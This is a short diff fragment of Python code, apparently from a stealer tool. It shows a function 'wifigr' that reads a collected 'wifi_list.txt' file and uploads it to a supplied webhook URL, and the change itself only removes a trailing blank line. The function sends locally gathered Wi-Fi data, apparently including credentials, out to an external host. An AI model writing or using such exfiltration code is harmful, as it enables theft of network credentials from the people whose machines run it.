@@ -43,4 +43,3 @@ def wifigr(webhook:str):
     files = {"wifi_list": open(f"{__location__}/wifi_list.txt", "rb")}
     requests.post(webhook, files=files)
     files["wifi_list"].close()
-
